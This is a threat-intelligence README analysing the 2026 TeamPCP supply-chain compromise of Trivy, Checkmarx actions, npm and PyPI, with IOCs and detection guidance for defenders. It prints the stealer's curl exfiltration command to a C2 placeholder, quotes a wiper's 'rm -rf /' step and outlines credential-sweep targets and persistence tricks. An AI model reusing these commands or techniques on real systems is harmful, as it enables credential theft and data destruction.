# TeamPCP Supply Chain Attack: Technical Analysis & Detection Guide

> **CVE-2026-33634** (CVSS 9.4) — The most impactful CI/CD supply chain attack of 2026 so far.

Between March 19–25, 2026, threat actor **TeamPCP** (also tracked as DeadCatx3, PCPcat, ShellForce, CanisterWorm) executed a cascading supply chain compromise across five ecosystems: GitHub Actions, Docker Hub, OpenVSX, npm, and PyPI. Starting from a single incompletely-rotated GitHub PAT, the campaign spread across two major open-source security vendors (Aqua Security and Checkmarx), four GitHub Actions repositories, two VS Code extensions, container registries, and 66+ npm packages.

This repository provides a full technical breakdown, curated IOC lists (FP-tested), and detection queries ready to deploy in Microsoft Defender XDR.

---

## Table of Contents

- [Attack Timeline](#attack-timeline)
- [Kill Chain Breakdown](#kill-chain-breakdown)
- [Compromised Artifacts](#compromised-artifacts)
- [Credential Stealer Mechanics](#credential-stealer-mechanics)
- [CanisterWorm — npm Propagation](#canisterworm--npm-propagation)
- [Iran-Targeted Wiper Component](#iran-targeted-wiper-component)
- [Detection & Hunting](#detection--hunting)
- [IOC List](#ioc-list)
- [FP Filtering Notes](#fp-filtering-notes)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [References](#references)

---

## Attack Timeline

| Date (UTC) | Event |
|---|---|
| Feb 20, 2026 | `hackerbot-claw` account created; begins scanning repos for exploitable `pull_request_target` workflows |
| Feb 28, 2026 | First Trivy compromise via PWN request; credentials exfiltrated |
| Mar 1, 2026 | Aqua Security attempts containment — credential rotation incomplete |
| **Mar 19, 17:43** | **Main strike:** TeamPCP force-pushes 75/76 tags in `aquasecurity/trivy-action` + all 7 tags in `setup-trivy` via compromised `aqua-bot` service account |
| Mar 19, 18:22 | Backdoored Trivy v0.69.4 published to GitHub Releases, Docker Hub, GHCR, ECR |
| Mar 20, 05:40 | Trivy-action compromise window closes (~12 hours) |
| Mar 20, 20:45 | CanisterWorm detected spreading across npm — 47+ packages compromised |
| Mar 22, 20:31 | TeamPCP defaces all 44 repos in `aquasec-com` GitHub org in a scripted 2-minute burst |
| Mar 22 | Docker Hub images `0.69.5` and `0.69.6` pushed with same stealer payload |
| **Mar 23, 02:53** | **Checkmarx wave begins:** Malicious `ast-results` v2.53.0 and `cx-dev-assist` v1.7.0 published to OpenVSX via `ast-phoenix` account |
| Mar 23, 12:58 | All 35 tags of `Checkmarx/kics-github-action` force-pushed via compromised `cx-plugins-releases` account |
| Mar 23, 15:41 | Checkmarx reports OpenVSX issue resolved |
| Mar 23, 16:50 | KICS GitHub Action taken down after user report |
| Mar 23, 22:25 | Sysdig reports `Checkmarx/ast-github-action` v2.3.28 also compromised |
| **Mar 24, 08:30** | **LiteLLM wave:** Trojanized `litellm` v1.82.7 and v1.82.8 published to PyPI using stolen credentials |
| Mar 24, 11:25 | PyPI quarantines malicious LiteLLM versions |

---

## Kill Chain Breakdown

### Phase 1 — Initial Access

Root cause: incomplete credential rotation after the February 28 breach. The `aqua-bot` service account PAT was either not revoked or the attacker observed the new token during rotation.

TeamPCP used this retained access to force-push version tags to malicious imposter commits. Each forged commit cloned the original's metadata (author, timestamp, message) while replacing the entry point script with the stealer payload. GitHub's release page showed no visible change — even the "Immutable" badge displayed normally.

### Phase 2 — Payload Execution

The stealer — a 204-line `entrypoint.sh` self-identified as "TeamPCP Cloud stealer" — runs a three-stage attack:

**Stage 1: Memory Scraping**
```
Reads /proc/<pid>/mem from Runner.Worker processes
Searches for pattern: {"value":"<secret>","isSecret":true}
Extracts GitHub PATs, cloud credentials, API keys from runner memory
```

**Stage 2: Filesystem Credential Sweep**

Scans 50+ sensitive paths including:
- SSH keys (`~/.ssh/*`)
- AWS/GCP/Azure credentials
- Kubernetes tokens and configs
- Docker registry credentials
- Terraform state files
- Crypto wallets (Solana, Bitcoin, Ethereum, Cardano)
- npm tokens (`~/.npmrc`)
- Shell histories
- `.env` files

**Stage 3: Encrypted Exfiltration**
- Bundles all harvested data into `tpcp.tar.gz`
- Encrypts with AES-256-CBC (random session key) + RSA-4096/RSA-OAEP (attacker's public key)
- Exfiltrates via `curl POST` to vendor-specific typosquat domains
- Fallback: creates `tpcp-docs` or `docs-tpcp` repo in victim's GitHub account using stolen `GITHUB_TOKEN`

### Phase 3 — Persistence

On non-CI Linux systems, the malware:
1. Creates hidden directory `~/.config/sysmon/`
2. Drops a Python backdoor (`sysmon.py`)
3. Installs a systemd user service that polls C2 every 50 minutes
4. Kill switch: if C2 response contains "youtube", backdoor skips execution

### Phase 4 — Lateral Movement (Checkmarx Wave)

Stolen credentials from the Trivy wave enabled compromise of Checkmarx's ecosystem. Each new wave used a different typosquat C2 domain to evade blocklists from the previous wave:

| Wave | C2 Domain | Typosquat Of |
|---|---|---|
| Trivy | `scan.aquasecurtiy[.]org` | aquasecurity.org |
| Checkmarx/KICS | `checkmarx[.]zone` | checkmarx.com |
| LiteLLM | `models.litellm[.]cloud` | litellm.ai |

---

## Compromised Artifacts

### GitHub Actions

| Repository | Tags Compromised | Exposure Window (UTC) | Entry Point |
|---|---|---|---|
| `aquasecurity/trivy-action` | 75 of 76 (safe: `0.35.0`) | Mar 19 17:43 – Mar 20 05:40 | `entrypoint.sh` |
| `aquasecurity/setup-trivy` | All 7 tags | Mar 19 17:43 – 21:44 | `action.yaml` |
| `Checkmarx/kics-github-action` | All 35 tags | Mar 23 12:58 – 16:50 | `setup.sh` |
| `Checkmarx/ast-github-action` | v2.3.28 (likely all) | Mar 23 ~22:25+ | `setup.sh` |

### OpenVSX Extensions (VS Code Marketplace NOT affected)

| Extension | Malicious Version | Safe Version |
|---|---|---|
| `checkmarx.ast-results` | 2.53.0 | >= 2.56.0 |
| `checkmarx.cx-dev-assist` | 1.7.0 | >= 1.10.0 |

Both extensions were published 12 seconds apart at 12:53 UTC on March 23 via the `ast-phoenix` account. On activation, `environmentAuthChecker.js` checks for cloud provider credentials, then pulls a second-stage stealer from `checkmarx[.]zone/static/checkmarx-util-1.0.4.tgz`.

### Container Images

| Image | Malicious Tags |
|---|---|
| `docker.io/aquasec/trivy` | 0.69.4, 0.69.5, 0.69.6 |
| `ghcr.io/aquasecurity/trivy` | 0.69.4, 0.69.5, 0.69.6 |
| `public.ecr.aws/aquasecurity/trivy` | 0.69.4, 0.69.5, 0.69.6 |

### PyPI

| Package | Versions | Backdoored File |
|---|---|---|
| `litellm` | 1.82.7, 1.82.8 | `litellm/proxy/proxy_server.py` |

Triple-nested base64 payload with K8s lateral movement toolkit. Persistence via `sysmon.service` polling `checkmarx.zone/raw`.

---

## Credential Stealer Mechanics

The exfiltration pattern is identical across all waves:

```bash
curl -s -o /dev/null -w %{http_code} -X POST https://<c2_domain> \
  -H "Content-Type: application/octet-stream" \
  -H "X-Filename: tpcp.tar.gz" \
  --data-binary @/tmp/tmp.XXXXXXXXXX/tpcp.tar.gz
```

The typosquat domain strategy is deliberate: an analyst reviewing CI/CD logs sees `curl` traffic to what looks like the action's own vendor domain. Without careful comparison, `scan.aquasecurtiy.org` passes for `aquasecurity.org` in a fast log review.

Only the attacker can decrypt stolen data — the AES session key is RSA-OAEP encrypted with their public key.

---

## CanisterWorm — npm Propagation

Within 24 hours of the Trivy compromise, stolen npm tokens enabled a self-propagating worm across 66+ packages (141 malicious artifacts).

**What makes CanisterWorm notable:**
- First documented npm malware using an **ICP (Internet Computer Protocol) blockchain canister** as C2
- The canister at `tdtqy-oyaaa-aaaae-af2dq-cai` is a decentralized smart contract — no single takedown point
- Exposes 3 methods: `get_latest_link`, `http_request`, `update_link`
- Attacker can rotate payloads on all infected machines without republishing any npm package
- Kill switch: if canister returns a URL containing `youtube.com`, backdoor sleeps
- Persistence: systemd user service masquerading as `pgmon` (PostgreSQL monitoring)
- Polling interval: every 50 minutes
- Binary dropped to `/tmp/pglog`, state tracked in `/tmp/.pg_state`

**Known compromised scopes:** `@emilgroup/*`, `@teale.io/*` (self-propagating variant in `@teale.io/eslint-config` v1.8.11, v1.8.12)

---

## Iran-Targeted Wiper Component

A destructive variant targets Iranian systems specifically:

1. **Kubernetes + Iran:** deploys privileged DaemonSets across every node (including control plane), wipes and force-reboots via container named `kamikaze`
2. **Kubernetes + non-Iran:** installs CanisterWorm backdoor as systemd service
3. **Non-K8s + Iran:** executes `rm -rf / --no-preserve-root` with sudo
4. **Non-K8s + non-Iran:** no action

Detection is via system timezone and locale checks.

---

## Detection & Hunting

### Microsoft Defender XDR — Custom Detection Rule

**Rule name:** `TeamPCP Supply Chain C2 and Malware IOC Match`  
**Severity:** High  
**Category:** CommandAndControl  
**Frequency:** Every 1 hour  

See [`detection/defender_xdr_query.kql`](detection/defender_xdr_query.kql) for the full KQL query.

The query covers:
- 7 SHA256 file hashes (stealer + CanisterWorm variants)
- 2 C2 IP addresses
- 4 C2 domains (typosquats + ICP canister)
- 4 specific C2 URLs
- DNS resolution checks

### Defender TI Indicators Import

A ready-to-import CSV is provided at [`iocs/FINAL_TeamPCP_IOC_25Mar2026.csv`](iocs/FINAL_TeamPCP_IOC_25Mar2026.csv). This file has been FP-tested against a production aviation infrastructure environment.

### Other Platforms

| Platform | Detection |
|---|---|
| **Palo Alto Cortex XDR** | Rule `ioc.linux.shaihulud.2` — credential-access on GitHub Action runners |
| **Sysdig/Falco** | `Contact EC2 Instance Metadata Service From Container`, `Curl Exfiltrating File`, `Exfiltration of AWS IMDS Credentials Using LOTL Binary` |

---

## IOC List

### File Hashes (SHA256)

| Hash | Description | Source |
|---|---|---|
| `18a24f83e807479438dcab7a1804c51a00dafc1d526698a66e0640d1e5dd671a` | Trivy malicious `entrypoint.sh` | Phoenix Security |
| `c37c0ae9641d2e5329fcdee847a756bf1140fdb7f0b7c78a40fdc39055e7d926` | CanisterWorm Wave 4 — final form | Aikido Security |
| `0c0d206d5e68c0cf64d57ffa8bc5b1dad54f2dda52f24e96e02e237498cb9c3a` | CanisterWorm Wave 3 — self-propagating test | Aikido Security |
| `61ff00a81b19624adaad425b9129ba2f312f4ab76fb5ddc2c628a5037d31a4ba` | CanisterWorm Wave 2 — armed ICP backdoor | Aikido Security |
| `f398f06eefcd3558c38820a397e3193856e4e6e7c67f81ecc8e533275284b152` | CanisterWorm Wave 1 — deploy.js | Aikido Security |
| `7df6cef7ab9aae2ea08f2f872f6456b5d51d896ddda907a238cd6668ccdc4bb7` | CanisterWorm Wave 2 — deploy.js | Aikido Security |
| `5e2ba7c4c53fa6e0cef58011acdd50682cf83fb7b989712d2fcf1b5173bad956` | CanisterWorm Wave 3+ — deploy.js minified | Aikido Security |

### Network IOCs

| Indicator | Type | Purpose |
|---|---|---|
| `83.142.209.11` | IP | C2 server (checkmarx.zone) |
| `45.148.10.212` | IP | C2 server (scan.aquasecurtiy.org) |
| `checkmarx[.]zone` | Domain | C2 — Checkmarx/KICS/LiteLLM wave |
| `scan.aquasecurtiy[.]org` | Domain | C2 — Trivy wave |
| `models.litellm[.]cloud` | Domain | C2 — LiteLLM PyPI wave |
| `tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0[.]io` | Domain | ICP canister dead-drop C2 |

### C2 URL Paths

| URL | Function |
|---|---|
| `checkmarx[.]zone/static/checkmarx-util-1.0.4.tgz` | Second-stage payload download |
| `checkmarx[.]zone/vsx` | Exfiltration endpoint |
| `checkmarx[.]zone/raw` | Persistence polling (50 min) |
| `tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0[.]io/` | ICP canister C2 |

### Persistence Artifacts

| Path | Purpose |
|---|---|
| `~/.config/sysmon/` | Backdoor directory |
| `~/.config/sysmon.py` | Python backdoor |
| `~/.config/systemd/user/sysmon.service` | Systemd persistence |
| `~/.config/systemd/user/pgmon.service` | CanisterWorm persistence (PostgreSQL masquerade) |
| `/tmp/pglog` | Downloaded binary |
| `/tmp/.pg_state` | C2 polling state |

### GitHub Exfiltration Repos (Fallback)

| Name | Wave |
|---|---|
| `tpcp-docs` | Trivy |
| `docs-tpcp` | Checkmarx |

---

## FP Filtering Notes

The detection queries and IOC CSV in this repo have been tested against a production environment running:
- Ansible AWX/Tower with community.general and kubernetes.core collections
- Claude Code and GitHub Copilot on macOS developer workstations  
- FortiMonitor agent (IMDS polling)
- Oracle AHF on OCI instances (IMDS polling)
- Various Python/Node.js development toolchains

The following IOCs were **removed** due to confirmed false positives:

| IOC | FP Source |
|---|---|
| `setup.sh` (filename) | Ansible collections, Claude Code plugin cache, Bitnami scripts |
| `service.py` (filename) | Ansible module_utils, protobuf, boto3, FreeIPA, K8s core |
| `deploy.js` (filename) | Standard npm/node file |
| `169.254.169.254` (IMDS IP) | FortiMonitor agent, Oracle AHF — legitimate monitoring |
| `icp0.io` (parent domain) | Too broad, catches legitimate ICP traffic |
| `hooks.slack.com` (cmdline) | Legitimate Slack integrations |
| `discord.com/api/webhooks` (cmdline) | Legitimate Discord integrations |

---

## MITRE ATT&CK Mapping

| Technique | ID | Context |
|---|---|---|
| Supply Chain Compromise: Software Dependencies | T1195.002 | GitHub Actions tag poisoning, OpenVSX, npm, PyPI |
| Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | AWS IMDS theft from CI runners |
| Credentials from Password Stores | T1555 | Filesystem credential sweep (50+ paths) |
| OS Credential Dumping | T1003 | Runner.Worker `/proc/mem` scraping |
| Exfiltration Over C2 Channel | T1041 | Encrypted tpcp.tar.gz to typosquat domains |
| Web Service | T1102 | ICP canister dead-drop C2 |
| Systemd Service | T1543.002 | pgmon.service, sysmon.service persistence |
| Ingress Tool Transfer | T1105 | checkmarx-util-1.0.4.tgz download |
| Acquire Infrastructure: Domains | T1583.001 | Per-wave typosquat domains |

---

## References

| Source | Link |
|---|---|
| Wiz — KICS Compromise | https://www.wiz.io/blog/teampcp-attack-kics-github-action |
| Wiz — Trivy Compromise | https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack |
| Sysdig TRT — Checkmarx Expansion | https://www.sysdig.com/blog/teampcp-expands-supply-chain-compromise-spreads-from-trivy-to-checkmarx-github-actions |
| Checkmarx Official | https://checkmarx.com/blog/checkmarx-security-update/ |
| Phoenix Security — Full Timeline | https://phoenix.security/teampcp-supply-chain-attack-trivy-checkmarx-github-actions-npm-canisterworm/ |
| Aikido Security — CanisterWorm | https://www.aikido.dev/blog/teampcp-deploys-worm-npm-trivy-compromise |
| Endor Labs — LiteLLM | https://www.endorlabs.com/learn/teampcp-isnt-done |
| Mend — CanisterWorm | https://www.mend.io/blog/canisterworm-the-self-spreading-npm-attack-that-uses-a-decentralized-server-to-stay-alive/ |
| Socket — npm Compromise | https://socket.dev/blog/canisterworm-npm-publisher-compromise-deploys-backdoor-across-29-packages |
| StepSecurity — Trivy Analysis | https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release |
| JFrog — Extended Analysis | https://research.jfrog.com/post/canister-worm/ |
| Rami McCarthy — IOC Timeline | https://ramimac.me/trivy-teampcp/ |

---

## License

MIT — Use, share, adapt freely. Attribution appreciated.

---

**Author:** [Ugur Can Ates](https://linkedin.com/in/ugurcanates) — SOC Team Lead & Senior Security Engineer  
**Last Updated:** March 25, 2026
